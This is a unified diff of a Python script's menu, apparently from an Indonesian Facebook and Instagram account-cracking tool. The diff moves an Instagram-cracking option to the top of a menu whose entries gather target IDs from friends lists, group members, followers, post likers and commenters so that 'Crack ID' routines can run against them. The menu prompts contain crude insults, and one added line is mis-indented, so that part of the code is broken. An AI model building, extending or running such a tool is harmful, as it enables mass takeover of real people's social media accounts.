@@ -416,13 +416,13 @@ def moch_yayan():
     kueh  = {"cookie":_mmk_}
     print(" \x1b[1;97m[•] You IP   : %s"%(IP));time.sleep(0.03)
     print(" [•] \x1b[1;97mYou Name : %s%s%s\n"%(K,nama,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari teman publik'%(O,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari anggota grup'%(O,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m03%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari total followers'%(O,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m04%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari like postingan'%(O,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m05%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari random id massal'%(O,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m06%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari komentar postingan'%(O,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m07%s\x1b[1;93m] \x1b[1;97mCrack dari \x1b[1;93makun instagram \x1b[1;96m[%sNew%s\x1b[1;96m]'%(O,N,H,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;97mmenu \x1b[1;93minstagram\x1b[1;96m(%s%s\x1b[1;96m)'%(O,N,H,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari teman publik'%(O,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m03%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari anggota grup'%(O,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m04%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari total followers'%(O,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m05%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari like postingan'%(O,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m06%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari random id massal'%(O,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m07%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari komentar postingan'%(O,N));time.sleep(0.03)
     print(' \x1b[1;93m[%s\x1b[1;96m08%s\x1b[1;93m] \x1b[1;96mCheckpoint detector'%(O,N));time.sleep(0.03)
     print(' \x1b[1;93m[%s\x1b[1;96m09%s\x1b[1;93m] \x1b[1;97mSettings U/A \x1b[1;93m[\x1b[1;96muser agent\x1b[1;93m]'%(O,N));time.sleep(0.03)
     print(' \x1b[1;93m[%s\x1b[1;96m10%s\x1b[1;93m] \x1b[1;97mCheck dari \x1b[1;96mhasil crack'%(O,N));time.sleep(0.03)
@@ -431,7 +431,10 @@ def moch_yayan():
     pepek = input('\n [%s*%s] menu : '%(H,N))
     if pepek == '':
         print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
-    elif pepek in['1','01']:
+     elif pepek in['1','01']:
+            log_igeh()
+            menu_igeh()
+    elif pepek in['2','02']:
         try:
             print("\n [*] \x1b[1;97mKetik \x1b[1;92m'me' \x1b[1;97mjika ingin crack dari daftar teman")
             user = input(' [*] \x1b[1;96mmasukan id atau username : ')
@@ -440,7 +443,7 @@ def moch_yayan():
                 id.append(a['id'] + '<=>' + a['name'])
         except KeyError:
             print('\n %s[%s×%s] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
-    elif pepek in['2','02']:
+    elif pepek in['3','03']:
         kontol = input(f"{N} [?] \x1b[1;93mmasukkan id grup : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -459,7 +462,7 @@ def moch_yayan():
                     crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
             except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                 exit("\n [!] \x1b[1;91mKesalahan Pada Koneksi")
-    elif pepek in['3','03']:
+    elif pepek in['4','04']:
         kontol = input(f"{N} [?] \x1b[1;96mmasukan id atau username followers : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -468,7 +471,7 @@ def moch_yayan():
             followers(f"https://mbasic.facebook.com/subscribe/lists/?id={kontol}")
         except KeyError:
             print(f"\n [!] \x1b[1;93mWhy {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
-    elif pepek in['4','04']:
+    elif pepek in['5','05']:
         kontol = input(f"{N} [?] \x1b[1;96mmasukan id postingan : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -477,12 +480,12 @@ def moch_yayan():
             like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}")
         except KeyError:
             print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
-    elif pepek in['5','05']:
+    elif pepek in['6','06']:
         _ngocok_(kontol)
     elif pepek in['11']:
         login()
         target()
-    elif pepek in['6','06']:
+    elif pepek in['7','07']:
         kontol = input(f"{N} [?] \x1b[1;93mmasukan id postingan : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -491,9 +494,6 @@ def moch_yayan():
             ngomen_post(f"https://mbasic.facebook.com/{kontol}")
         except KeyError:
             print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
-    elif pepek in['7','07']:
-        log_igeh()
-        menu_igeh()
     elif pepek in['8','08']:
         gabut()
     elif pepek in['9','09']:
